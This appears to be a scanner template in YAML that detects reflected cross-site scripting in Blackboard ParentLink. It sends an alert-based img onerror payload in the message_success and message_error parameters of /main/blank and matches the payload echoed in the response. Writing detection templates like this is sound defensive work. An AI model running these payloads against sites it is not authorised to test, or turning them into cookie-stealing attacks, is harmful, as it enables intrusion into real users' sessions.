id: parentlink-xss
name: Blackboard - Cross-Site Scripting
severity: high
confidence: tentative
description: Blackboard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser
  of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication
  credentials and launch other attacks.
reference: CWE-79
tags:
- blackboard
- parentlink
- xss
- vuln
requests:
- method: GET
  path: /main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
  matchers: &id001
  - type: body
    words:
    - <img src=c onerror=alert(8675309)>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
  matchers: *id001
  condition: and
